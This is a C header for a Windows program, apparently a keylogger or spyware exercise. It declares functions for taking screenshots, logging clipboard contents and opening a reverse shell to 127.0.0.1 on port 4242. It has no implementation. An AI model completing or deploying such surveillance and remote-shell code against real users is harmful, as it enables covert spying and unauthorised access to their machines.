#ifndef WINKEY_H

#pragma warning(disable : 5045)
#pragma warning(disable : 4820)
#pragma warning(disable : 4113)
#pragma warning(disable : 4133)

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Windows.h>
#include <WinUser.h>
#include <wingdi.h>
#include <stdio.h>
#include <signal.h>
#include <winsock2.h>

#define IP "127.0.0.1"
#define PORT 4242

BOOL	DoScreenshot(void);
void	GetClipboard(FILE *flog);
void	reverse_shell(void);

#endif
